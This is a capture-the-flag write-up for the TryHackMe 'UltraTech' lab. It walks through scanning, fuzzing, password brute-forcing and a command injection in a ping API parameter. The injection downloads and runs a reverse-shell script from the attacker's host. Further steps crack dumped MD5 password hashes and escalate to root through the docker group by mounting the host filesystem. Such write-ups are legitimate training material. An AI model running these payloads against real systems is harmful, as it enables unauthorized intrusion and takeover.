# [UltraTech](https://tryhackme.com/room/ultratech1)

First as usual, `nmap`

```
# Nmap 7.92 scan initiated Sat Oct  2 13:00:51 2021 as: nmap -vvv -p 22,21,8081,31331 -sCV -oA init 10.10.25.87
Nmap scan report for box.ip (10.10.25.87)
Host is up, received conn-refused (0.22s latency).
Scanned at 2021-10-02 13:00:52 +07 for 23s

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
22/tcp    open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiFl7iswZsMnnI2RuX0ezMMVjUXFY1lJmZr3+H701ZA6nJUb2ymZyXusE/wuqL4BZ+x5gF2DLLRH7fdJkdebuuaMpQtQfEdsOMT+JakQgCDls38FH1jcrpGI3MY55eHcSilT/EsErmuvYv1s3Yvqds6xoxyvGgdptdqiaj4KFBNSDVneCSF/K7IQdbavM3Q7SgKchHJUHt6XO3gICmZmq8tSAdd2b2Ik/rYzpIiyMtfP3iWsyVgjR/q8oR08C2lFpPN8uSyIHkeH1py0aGl+V1E7j2yvVMIb4m3jGtLWH89iePTXmfLkin2feT6qAm7acdktZRJTjaJ8lEMFTHEijJ
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLy2NkFfAZMY462Bf2wSIGzla3CDXwLNlGEpaCs1Uj55Psxk5Go/Y6Cw52NEljhi9fiXOOkIxpBEC8bOvEcNeNY=
|   256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEipoohPz5HURhNfvE+WYz4Hc26k5ObMPnAQNoUDsge3
8081/tcp  open  http    syn-ack Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE PATCH
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 15C1B7515662078EF4B5C724E2927A96
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct  2 13:01:15 2021 -- 1 IP address (1 host up) scanned in 24.02 seconds
```

We can't log into FTP anonymously. We have a couple of web services on ports 8081 and 31331. The service on port 8081 seems to be an api, while the one on port 31331 is a normal web site. I tried fuzzing the API parameter.

```sh
$ ffuf -u "http://box.ip:8081/?FUZZ=test" -w ~/tools/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt -fs 20
```

That, however, returns nothing. Fuzzing the website on port 31331 for directories, we have some interesting results.

```sh
$ gobuster dir -u http://box.ip:31331/ -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html -r
/images               (Status: 200) [Size: 4164]
/partners.html        (Status: 200) [Size: 1986]
/index.html           (Status: 200) [Size: 6092]
/css                  (Status: 200) [Size: 1132]
/js                   (Status: 200) [Size: 1317]
/javascript           (Status: 403) [Size: 295]
/what.html            (Status: 200) [Size: 2534]
/server-status        (Status: 403) [Size: 297]
```

Besides the found directories, we have `robots.txt` whose content is as follows.

```
Allow: *
User-Agent: *
Sitemap: /utech_sitemap.txt
```

Going to `/utech_sitemap.txt` gives us a few more pages.

```
/
/index.html
/what.html
/partners.html
```

All were found in our `gobuster` result, though now we have an idea of what pages to target.

Looking around the source code of `/index.html`, the only interesting thing is the email `ultratech@yopmail.com` which we might be able to use to log in or something. `/what.html` has nothing useful. `/partners.html` is a login page. With the previously found email, we can brute-force the password.

```sh
$ ffuf -u "http://box.ip:8081/auth?login=ultratech%40yopmail.com&password=FUZZ" -w ~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt -fr "Invalid credentials"
```

This, however, gives us nothing. The API on port 8081 was used for login, and there may be more endpoints so we fuzz for those.

```sh
$ gobuster dir -u http://box.ip:8081/ -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
/auth                 (Status: 200) [Size: 39]
/ping                 (Status: 500) [Size: 1094]
/Ping                 (Status: 500) [Size: 1094]
/Auth                 (Status: 200) [Size: 39]
```

Looking at `/ping`, when a basic request is sent (no parameters), we get an HTTP 500 error and some debug output.

```
TypeError: Cannot read property 'replace' of undefined
    at app.get (/home/www/api/index.js:45:29)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/www/api/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/www/api/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/www/api/node_modules/express/lib/router/layer.js:95:5)
    at /home/www/api/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/www/api/node_modules/express/lib/router/index.js:335:12)
    at next (/home/www/api/node_modules/express/lib/router/index.js:275:10)
    at cors (/home/www/api/node_modules/cors/lib/index.js:188:7)
    at /home/www/api/node_modules/cors/lib/index.js:224:17
```

Looks like `replace` is run on a parameter which is to be submitted but we don't know what its name is, so we fuzz for it.

```sh
$ ffuf -u "http://box.ip:8081/ping?FUZZ=test" -w ~/tools/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt
$ ffuf -u "http://box.ip:8081/ping?FUZZ=test" -w ~/tools/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt -mc 500 -fs 1094
```

That, however, gives us nothing. Going back to the service on port 31331, looking around at the files, we see that `/js/api.js` makes a request to the `/ping` endpoint.

```javascript
const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`
```

Replicating the code, we can make a request to `ping` our machine.

```sh
curl 'http://box.ip:8081/ping?ip=YOUR_IP'
```

The output looks like that from a Linux's `ping` command. We can try command injection to get a shell. After some testing, I found the following to work.

1. Create `shell.sh` with a reverse shell in it and host it (`python3 -m http.server`)
2. ``http://box.ip:8081/ping?ip=`curl%2010.17.21.200:8000/shell.sh%20-o%20shell.sh` ``
3. ``http://box.ip:8081/ping?ip=`bash%20shell.sh` ``

With that, we should have a shell as `www`. Looking around the landing directory `/home/www/api`, we have the file `utech.db.sqlite` which we can download to our local machine and dump.

```sql
sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (
            login Varchar,
            password Varchar,
            type Int
        );
INSERT INTO users VALUES('admin','0d0ea5111e3c1def594c1684e3b9be84',0);
INSERT INTO users VALUES('r00t','f357a0c52799563c7c7b76c1e7543a32',0);
COMMIT;
```

We have a couple of MD5 hashes which can be cracked on [crackstation](https://crackstation.net/). Looking at `/etc/passwd` ...

```sh
www@ultratech-prod:~/api$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
r00t:x:1001:1001::/home/r00t:/bin/bash
www:x:1002:1002::/home/www:/bin/sh
```

... we see that we only have the user `r00t` and not `admin`, so we `su r00t` with the cracked password and get a shell as `r00t`.

Looking at our groups ...

```sh
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

... we see that we're in the `docker` group. Checking the images ...

```sh
r00t@ultratech-prod:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
bash                latest              495d6437fc1e        2 years ago         15.8MB
```

... we have an image ready to be deployed. Following [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#docker-group), we can mount the root file system on a docker instance and read from and write to everything.

```sh
docker run -it --rm -v /:/mnt bash chroot /mnt bash
```

We can then write our own SSH to root's `authorized_keys` and get a root shell on the machine.
